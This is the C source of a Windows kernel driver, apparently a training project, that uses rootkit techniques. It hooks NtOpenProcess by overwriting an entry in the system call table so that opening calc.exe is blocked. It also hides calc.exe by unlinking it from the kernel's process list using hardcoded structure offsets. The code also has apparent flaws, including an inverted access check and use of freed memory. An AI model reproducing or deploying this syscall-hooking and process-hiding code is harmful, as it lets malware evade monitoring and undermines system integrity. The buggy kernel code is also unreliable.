#include <ntifs.h>
#include <ntddk.h>
#include "driver.h"


#define DeviceName L"\\Device\\vince"
#define LnkDeviceName L"\\DosDevices\\vince"
//#define LegitimateName L"\\Device\\HarddiskVolume2\\Users\\toto\\Desktop\\SysinternalsSuite\\Winobj.exe"
#define LegitimateName L"\\Device\\HarddiskVolume2\\Users\\toto\\opendevice_vdrouin\\bin\\Debug\\opendevice_vdrouin.exe"
#define CalcName L"\\Device\\HarddiskVolume2\\Windows\\System32\\calc.exe"


NTSTATUS
ZwQueryInformationProcess (
    __in HANDLE ProcessHandle,
    __in PROCESSINFOCLASS ProcessInformationClass,
    __out_bcount_opt(ProcessInformationLength) PVOID ProcessInformation,
    __in ULONG ProcessInformationLength,
    __out_opt PULONG ReturnLength
    );

NTSTATUS NewNtCreateFile(
                    PHANDLE FileHandle,
                    ACCESS_MASK DesiredAccess,
                    POBJECT_ATTRIBUTES ObjectAttributes,
                    PIO_STATUS_BLOCK IoStatusBlock,
                    PLARGE_INTEGER AllocationSize OPTIONAL,
                    ULONG FileAttributes,
                    ULONG ShareAccess,
                    ULONG CreateDisposition,
                    ULONG CreateOptions,
                    PVOID EaBuffer OPTIONAL,
                    ULONG EaLength
)
{
	NTSTATUS retour;
	DbgPrint("New NT create file\n");
	retour = ((NTCREATEFILE)(OldNtCreateFile))(
                    FileHandle,
                    DesiredAccess,
                    ObjectAttributes,
                    IoStatusBlock,
                    AllocationSize OPTIONAL,
                    FileAttributes,
                    ShareAccess,
                    CreateDisposition,
                    CreateOptions,
                    EaBuffer OPTIONAL,
                    EaLength);
	return retour;
}

NTSTATUS NewNtOpenProcess(
	PHANDLE            ProcessHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PCLIENT_ID         ClientId
)
{
	NTSTATUS status;
	PUNICODE_STRING processName = NULL;
	UNICODE_STRING usCalcName;
	ULONG required_length = 0;
	
	RtlInitUnicodeString(&usCalcName,CalcName);
	
	status = ((NTOPENPROCESS)(OldNtOpenProcess))(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId);

    if(status != STATUS_SUCCESS)
	{
        return status;
	}

	status = ZwQueryInformationProcess(*ProcessHandle, ProcessImageFileName, NULL, 0, &required_length);
	if(status != STATUS_SUCCESS)
	{
		if(status == STATUS_INFO_LENGTH_MISMATCH)
		{
			DbgPrint("ZwQueryInformationProcess STATUS_INFO_LENGTH_MISMATCH\n");
			processName = ExAllocatePoolWithTag(PagedPool, (SIZE_T)required_length, 'Vinc');
			status = ZwQueryInformationProcess(*ProcessHandle, ProcessImageFileName, processName, required_length, &required_length);
			if(status != STATUS_SUCCESS)
			{
				DbgPrint("Error %x\n", status);
				ExFreePoolWithTag(processName, 'Vinc');
				return status;
			}
			
			if(!RtlEqualUnicodeString(&usCalcName, processName, TRUE))
			{
				DbgPrint("Name %wZ\n", processName);
			}
			else
			{
				ExFreePoolWithTag(processName, 'Vinc');
				DbgPrint("%wZ found\n",processName);
				return STATUS_ACCESS_DENIED;
			}
			ExFreePoolWithTag(processName, 'Vinc');
		}
	}
	return STATUS_SUCCESS;
}

NTSTATUS DriverDispatch(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
  	Irp->IoStatus.Status=STATUS_SUCCESS;
  	IoCompleteRequest(Irp,IO_NO_INCREMENT);
  	return Irp->IoStatus.Status;
}

NTSTATUS DriverCreate(IN PDEVICE_OBJECT DeviceObject, IN PIRP Irp)
{
	HANDLE handle;
	NTSTATUS status;
	PUNICODE_STRING processName = NULL;
	ULONG required_length = 0;
	HANDLE procHandle;
	UNICODE_STRING usLegitimateName;
	
	RtlInitUnicodeString(&usLegitimateName,LegitimateName);
	
	handle = PsGetCurrentProcessId();
    procHandle = ZwCurrentProcess();
	status = ZwQueryInformationProcess(procHandle, ProcessImageFileName, NULL, 0, &required_length);
	if(status != STATUS_SUCCESS)
	{
		if(status == STATUS_INFO_LENGTH_MISMATCH)
		{
			processName = ExAllocatePoolWithTag(PagedPool, (SIZE_T)required_length, 'Vinc');
			status = ZwQueryInformationProcess(procHandle, ProcessImageFileName, processName, required_length, &required_length);
			if(status != STATUS_SUCCESS)
			{
				DbgPrint("Error %x\n", status);
				ExFreePoolWithTag(processName, 'Vinc');
				return status;
			}
			
			if(!RtlEqualUnicodeString(&usLegitimateName, processName, TRUE))
			{
				DbgPrint("PID %i\n", handle);
				DbgPrint("Name %wZ\n", processName);
			}
			else
			{
				DbgPrint("ACCESS DENIED\n");
				Irp->IoStatus.Status = STATUS_ACCESS_DENIED;
				ExFreePoolWithTag(processName, 'Vinc');
				return Irp->IoStatus.Status;
			}
			
			ExFreePoolWithTag(processName, 'Vinc');
		}
	}
	
	Irp->IoStatus.Status=STATUS_SUCCESS;
	IoCompleteRequest(Irp,IO_NO_INCREMENT);
  	return Irp->IoStatus.Status;
}

void Unhook_fonction()
{	
	__try
	{
		InterlockedExchange( (PLONG) &MappedSystemCallTable[190], 
		(LONG) OldNtOpenProcess);

	
	}
	__except(1){
			DbgPrint("DriverEntry: Unhook failed");
	}
 
    // Unlock and Free MDL
	if(g_pmdlSystemCall)
	{
		MmUnmapLockedPages(MappedSystemCallTable, g_pmdlSystemCall);
		IoFreeMdl(g_pmdlSystemCall);
	}
	DbgPrint("Unhook Function \n");
}

void Hook_fonction()
{
	g_pmdlSystemCall=IoAllocateMdl(
	KeServiceDescriptorTable.ServiceTableBase, KeServiceDescriptorTable.NumberOfServices*4, 
	0, 0, NULL);

   	if(!g_pmdlSystemCall)
      	return;

   	MmBuildMdlForNonPagedPool(g_pmdlSystemCall);
	
	MappedSystemCallTable=MmMapLockedPages(g_pmdlSystemCall, KernelMode);

	__try{
		OldNtOpenProcess = (PVOID) InterlockedExchange( (PLONG) &MappedSystemCallTable[190], 
													(LONG) NewNtOpenProcess);	
		
	}
	__except(1){
			DbgPrint("DriverEntry: Hook failed");

	}
}


VOID HideCalc()
{
	//Get pointer on EPROCESS : IoGetCurrentProcess()
	//process name offset 0x16C
	//process list -> print them (offset 0x0b8)
	
	PEPROCESS myEProcess;
	PLIST_ENTRY current;
	PLIST_ENTRY next;
	BOOLEAN found = FALSE;
	
	myEProcess = IoGetCurrentProcess();
	
	DbgPrint("Current process PID %d name %s\n", *(PULONG)(((PCHAR)myEProcess)+0x0B4),((PCHAR)myEProcess)+0x16C);
	
	current = (PLIST_ENTRY)(((PCHAR)myEProcess)+0x0B8);
	next = current->Flink;
	while(next != current)
	{
		DbgPrint("- %d %s\n",*(PULONG)(((PCHAR)next) - 4),((PCHAR)next)+(0x16C-0x0B8));
		if(strncmp(((PCHAR)next)+(0x16C-0x0B8), "calc.exe",16) == 0)
		{
			found = TRUE;
			break;
		}
		next = next->Flink;
	}
	if(found)
	{
		next->Flink->Blink = next->Blink;
		next->Blink->Flink = next->Flink;
	}
}


NTSTATUS DriverUnload(IN PDRIVER_OBJECT DriverObject)
{
	UNICODE_STRING usLnkName;
	RtlInitUnicodeString(&usLnkName,LnkDeviceName);
	
	Unhook_fonction();
	
    IoDeleteSymbolicLink(&usLnkName);

    IoDeleteDevice(DriverObject->DeviceObject);
	DbgPrint("Bye !!\n");
	return STATUS_SUCCESS;
}

NTSTATUS DriverEntry(PDRIVER_OBJECT  pDriverObject, PUNICODE_STRING  pRegistryPath)
{
	ULONG i,NtStatus;
	PDEVICE_OBJECT pDeviceObject=NULL;
	UNICODE_STRING usDriverName,usLnkName;

	DbgPrint("Hello from KernelLand master\n");
	
	for(i=0;i<IRP_MJ_MAXIMUM_FUNCTION;i++)
		pDriverObject->MajorFunction[i]=DriverDispatch;
	
	pDriverObject->MajorFunction[IRP_MJ_CREATE]=DriverCreate;
	
	RtlInitUnicodeString(&usDriverName,DeviceName);
	RtlInitUnicodeString(&usLnkName,LnkDeviceName);
	
	NtStatus=IoCreateDevice(pDriverObject,
							0, 
	 						&usDriverName, 
	 						FILE_DEVICE_UNKNOWN, 
	 						FILE_DEVICE_SECURE_OPEN, 
	 						FALSE, 
	 						&pDeviceObject);
	if(NtStatus!=STATUS_SUCCESS)
		DbgPrint("Error with IoCreateDevice()");

	
	NtStatus=IoCreateSymbolicLink(&usLnkName,&usDriverName);
	if(NtStatus!=STATUS_SUCCESS)
		DbgPrint("Error with IoCreateSymbolicLink()");
	
	pDriverObject->DriverUnload=DriverUnload;
	DbgPrint("Hello from KernelLand master\n");
	
	HideCalc();
	
	Hook_fonction();

	return STATUS_SUCCESS;	
}

